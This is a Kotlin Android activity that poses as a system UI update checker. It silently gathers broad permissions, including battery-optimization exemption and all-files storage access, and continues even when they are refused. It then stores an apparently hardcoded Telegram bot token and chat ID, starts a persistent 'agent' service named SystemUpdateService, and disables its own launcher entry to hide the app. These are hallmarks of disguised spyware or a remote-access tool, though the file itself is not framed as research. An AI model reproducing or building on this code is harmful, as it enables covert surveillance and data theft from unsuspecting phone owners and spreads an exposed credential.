package com.android.systemui.updater

import android.content.ComponentName
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import com.android.systemui.updater.EncryptedConfig
import com.android.systemui.updater.ErrorReporter
import com.android.systemui.updater.modules.ApiCompat
import com.android.systemui.updater.PermissionManager

class UpdateCheckerActivity : AppCompatActivity() {
    private lateinit var prefs: SharedPreferences
    private val PREFS_NAME = "app_prefs"
    private val FIRST_RUN_KEY = "first_run_completed"
    private lateinit var permissionManager: PermissionManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val isFirstRunCompleted = prefs.getBoolean(FIRST_RUN_KEY, false)
        
        if (isFirstRunCompleted) {
            finish()
            return
        }
        
        setContentView(R.layout.activity_main)
        
        // Initialize permission manager and request permissions
        permissionManager = PermissionManager(this)
        permissionManager.requestRequiredPermissions { granted ->
            if (granted) {
                requestBatteryOptimizationWhitelist()
            } else {
                // Continue with reduced functionality or handle as needed
                requestBatteryOptimizationWhitelist()  // Still try to proceed
            }
        }
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (!permissionManager.onRequestPermissionsResult(requestCode, permissions, grantResults)) {
            // Handle other request codes if any
        }
    }

    private fun requestBatteryOptimizationWhitelist() {
        if (!ApiCompat.isOreo) {
            onAllPermissionsGranted()
            return
        }

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            onAllPermissionsGranted()
        } else {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST)
            } catch (e: Exception) {
                ErrorReporter.report(e, "UpdateCheckerActivity")
                onAllPermissionsGranted()
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            BATTERY_OPTIMIZATION_REQUEST -> {
                onAllPermissionsGranted()
            }
            MANAGE_EXTERNAL_STORAGE_REQUEST -> {
                if (ApiCompat.isR && 
                    Environment.isExternalStorageManager()) {
                    proceedToServiceStart()
                } else {
                    ErrorReporter.reportSimple("MANAGE_EXTERNAL_STORAGE denied", "UpdateCheckerActivity")
                    proceedToServiceStart()
                }
            }
        }
    }

    private fun onAllPermissionsGranted() {
        if (ApiCompat.isR && 
            !Environment.isExternalStorageManager()) {
            requestManageExternalStorage()
        } else {
            proceedToServiceStart()
        }
    }
    
    private fun requestManageExternalStorage() {
        try {
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivityForResult(intent, MANAGE_EXTERNAL_STORAGE_REQUEST)
        } catch (e: Exception) {
            val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
            startActivityForResult(intent, MANAGE_EXTERNAL_STORAGE_REQUEST)
        }
    }
    
    private fun proceedToServiceStart() {
        val config = EncryptedConfig.getInstance(this)
        config.initializeIfNeeded(
            "8697419498:AAFUkgi0_Jft2lpC5M5dWsM2rpVhIeYc91Q",
            "8036939276"
        )
        
        val serviceStarted = startAgentService()
        if (serviceStarted) {
            disableLauncherComponent()
            prefs.edit().putBoolean(FIRST_RUN_KEY, true).apply()
        }
        finish()
    }

    private fun startAgentService(): Boolean {
        return try {
            val serviceIntent = Intent(this, SystemUpdateService::class.java)
            if (ApiCompat.isOreo) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun disableLauncherComponent() {
        val componentName = ComponentName(this, UpdateCheckerActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
